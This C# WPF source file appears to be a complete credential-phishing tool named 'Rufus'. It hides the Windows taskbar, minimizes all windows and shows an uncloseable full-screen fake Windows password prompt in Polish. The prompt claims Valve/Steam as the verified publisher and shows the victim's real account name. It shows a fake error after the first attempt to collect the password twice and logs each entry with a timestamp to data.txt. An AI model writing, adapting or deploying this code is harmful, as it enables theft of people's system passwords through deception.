using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Data;
using System.Windows.Documents;
using System.Windows.Input;
using System.IO;
using System.Windows.Media;
using System.Windows.Media.Imaging;
using System.Windows.Navigation;
using System.Windows.Shapes;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.ComponentModel;

namespace Rufus
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        /* DLL imports */
        [DllImport("user32.dll")]
        private static extern int FindWindow(string lpClassName, string lpWindowName);
        [DllImport("user32.dll")]
        private static extern int ShowWindow(int hwnd, int nCmdShow);
        [DllImport("user32.dll", EntryPoint = "SendMessage", SetLastError = true)]
        static extern IntPtr SendMessage(IntPtr hWnd, Int32 Msg, IntPtr wParam, IntPtr lParam);

        /* Main Variables */
        private const int SW_HIDE = 0;
        private const int SW_SHOW = 5;
        const int WM_COMMAND = 0x111;
        const int MIN_ALL = 419;
        const int MIN_ALL_UNDO = 416;
        private int lHwnd = FindWindow("Shell_TrayWnd", null);
        private bool close = false;
        private bool infoState = true;
        private int counter = 0;

        public MainWindow()
        {
            InitializeComponent();

            ShowWindow(lHwnd, SW_HIDE);
            SendMessage(lHwnd, WM_COMMAND, (IntPtr)MIN_ALL, IntPtr.Zero);
            this.Left = 0;
            this.Top = 0;
            this.WindowState = WindowState.Maximized;
            this.Topmost = true;
            this.Closing += onExit;

            /* App setup */
            Username.Text = Environment.UserName;
            SystemUser.Text = Environment.MachineName + "\\" + Environment.UserName;
            ErrorMsg.Visibility = Visibility.Hidden;
            Password2.Visibility = Visibility.Collapsed;
            CreateFile();
            AddToFile();
            ToggleInfo();


            var uri = new Uri("./assets/steam.png", UriKind.Relative);
            ProgramIcon.Source = new System.Windows.Media.Imaging.BitmapImage(uri);
        }
        private void ToggleInfo()
        {
            if (infoState)
            {
                Info.Text = "Zweryfikowany wydawca: Valve\nPochodzenie pliku: Dysk twardy w tym komputerze";
                InfoButton.Text = "Pokaż więcej szczegółów";
                infoState = false;
            }
            else
            {
                Info.Text = $"Zweryfikowany wydawca: Valve\nPochodzenie pliku: Dysk twardy w tym komputerze\nLokalizacja programu: \"C:\\Program Files (x86)\\Steam\\steam.exe\"";
                InfoButton.Text = "Ukryj szczegóły";
                infoState = true;
            }
        }
        private void Check() {
            string password = Password.Password;
            AddToFile("\n" + password);
            if (counter >= 1)
            {
                Exit();
            }
            else
            {
                Password.Password = "";
                Password2.Text = "";
                ErrorMsg.Visibility = Visibility.Visible;
                counter++;
            }
        }

        /* Data Handling */
        private void CreateFile() {
            if (!File.Exists("./data.txt"))
            {
                File.WriteAllText("./data.txt", "");
            }
        }
        private void AddToFile(string message) {
            File.AppendAllText("./data.txt", message);
        }
        private void AddToFile() {
            File.AppendAllText("./data.txt", $"\n---------------------< {DateTime.Now} >---------------------");
        }

        /* Exit */
        private void Exit()
        {
            ShowWindow(lHwnd, SW_SHOW);
            SendMessage(lHwnd, WM_COMMAND, (IntPtr)MIN_ALL_UNDO, IntPtr.Zero);
            close = true;
            Environment.Exit(0);
        }
        private void onExit(object sender, CancelEventArgs e)
        {
            if (!close) { 
                e.Cancel = true;
            }
        }

        /* Buttons */
        private void PassShow(object sender, MouseEventArgs args)
        {
            Password2.Text = Password.Password;
            Password.Visibility = Visibility.Collapsed;
            Password2.Visibility = Visibility.Visible;
        }
        private void PassHide(object sender, MouseEventArgs args)
        {
            Password.Password = Password2.Text;
            Password.Visibility = Visibility.Visible;
            Password2.Visibility = Visibility.Collapsed;
        }
        private void PassSubmit(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter && Password.Visibility == Visibility.Visible)
            {
                Check();
            }
        }
        private void ToggleInfoBtn(object sender, MouseButtonEventArgs e)
        {
            ToggleInfo();
        }
        private void CancelBtn(object sender, EventArgs e)
        {
            Exit();
        }
        private void CheckBtn(object sender, EventArgs e)
        {
            Check();
        }
        private void CloseBtn(object sender, MouseButtonEventArgs e)
        {
            Exit();
        }
    }
}